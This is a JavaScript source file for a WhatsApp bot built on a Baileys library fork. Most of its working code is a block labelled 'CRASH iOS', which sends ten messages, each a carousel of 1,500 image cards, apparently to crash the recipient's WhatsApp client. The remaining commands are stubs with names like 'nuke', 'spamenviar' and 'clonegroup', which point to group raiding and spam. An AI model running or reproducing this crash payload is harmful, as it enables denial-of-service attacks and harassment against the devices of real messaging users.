// main.js
const {
  generateWAMessageFromContent,
  downloadContentFromMessage,
  makeCacheableSignalKeyStore,
  prepareWAMessageMedia,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
  PHONENUMBER_MCC,
  useMultiFileAuthState,
  generateMessageID,
  getTypeMessage,
  makeWASocket,
  delay,
  proto,
  store,
  chats
} = require("@angstvorfrauen/baileys");
const { Boom } = require("@hapi/boom");
const libPhonenumber = require("libphonenumber-js");
const moment = require("moment-timezone");
const NodeCache = require("node-cache");
const path = require("path");
const pino = require("pino");
const Jimp = require("jimp");
const os = require("os");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

module.exports = async (sock, m, chatUpdate) => {
  const message = m;
  m.id = m.key.id;
  m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
  m.chat = m.key.remoteJid;
  m.fromMe = m.key.fromMe;
  m.isGroup = m.chat.endsWith("@g.us");
  m.sender = sock.decodeJid(m.fromMe && sock.user.id || m.participant || m.key.participant || m.chat || "");
  if (m.isGroup) m.participant = sock.decodeJid(m.key.participant) || "";

  function getTypeM(message) {
    const type = Object.keys(message);
    const restype = (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) || type[type.length - 1] || Object.keys(message)[0];
    return restype;
  }

  m.mtype = getTypeM(m.message);
  m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
  m.text = m.msg?.text || m.msg?.caption || m.message?.conversation || m.msg?.contentText || m.msg?.selectedDisplayText || m.msg?.title || "";

  const from = message.key.remoteJid;
  var body = (m.mtype === "interactiveResponseMessage") ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
    (m.mtype === "conversation") ? m.message.conversation :
    (m.mtype === "deviceSentMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "imageMessage") ? m.message.imageMessage.caption :
    (m.mtype == "videoMessage") ? m.message.videoMessage.caption :
    (m.mtype == "extendedTextMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "buttonsResponseMessage") ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.mtype == "templateButtonReplyMessage") ? m.message.templateButtonReplyMessage.selectedId :
    (m.mtype == "messageContextInfo") ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : "";

  const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
      i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : "";
    }
    return admins || [];
  };

  const sleep = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
  var budy = (typeof m.text == "string" ? m.text : "");
  const bardy = body || "";
  const prefix = [".", "!", ""];
  var prefixMatch = prefix ? bardy.match(new RegExp(`^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]`)) ? bardy.match(new RegExp(`^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]`))[0] : "" : prefix ?? "";
  const isCmd = bardy.startsWith(prefixMatch);
  const command = isCmd ? bardy.slice(prefixMatch.length).trim().split(" ").shift().toLowerCase() : "";
  const args = bardy.trim().split(/ +/).slice(1);
  const text = args.join(" ");
  const IsOwner = (m.sender === "5582993708218@s.whatsapp.net");
  const botNumber = await sock.decodeJid(sock.user.id);

  sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
    const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
    return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id });
  };

  // === CRASH iOS (case "") ===
  if (command === "") {
    for (let i = 0; i < 10; i++) {
      const singleCard = {
        "header": {
          "title": ".",
          "imageMessage": {
            "url": url,
            "mimetype": "image/jpeg",
            "caption": ".",
            "fileSha256": fileSha256,
            "fileLength": "10",
            "height": 1000,
            "width": 1000,
            "mediaKey": mediaKey,
            "fileEncSha256": fileEncSha256,
            "directPath": directPath,
            "jpegThumbnail": jpegThumbnail,
          },
          "hasMediaAttachment": true
        },
        "body": { "text": "." },
        "footer": { "text": "." },
        "nativeFlowMessage": {
          "buttons": [
            {
              "name": "cta_url",
              "buttonParamsJson": JSON.stringify({
                "display_text": "x",
                "url": "https://google.com",
                "merchant_url": "https://google.com"
              })
            }
          ]
        }
      };
      const card = Array(1500).fill(singleCard);
      await sock.sendjson(from, {
        "interactiveMessage": {
          "body": { "text": "." },
          "carouselMessage": { "cards": card }
        }
      });
    }
    console.log("Crash enviado via main.js");
    return;
  }

  // === RESTANTE DOS COMANDOS (sem alterações) ===
  switch (command) {
    case "help": /* ... seu código ... */ break;
    case "lockall": /* ... */ break;
    case "unlockall": /* ... */ break;
    case "cgm": /* ... */ break;
    case "ct": /* ... */ break;
    case "nameall": /* ... */ break;
    case "spamenviar": /* ... */ break;
    case "x": /* ... */ break;
    case "bcgp": /* ... */ break;
    case "clonegroup": /* ... */ break;
    case "info": /* ... */ break;
    case "nuke": /* ... */ break;
    case "me": /* ... */ break;
    case "from": /* ... */ break;
    case "refresh": /* ... */ break;
    case "ping": /* ... */ break;
    case "restart": /* ... */ break;
    default: break;
  }
};

// Auto-reload
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  delete require.cache[file];
  require(file);
});
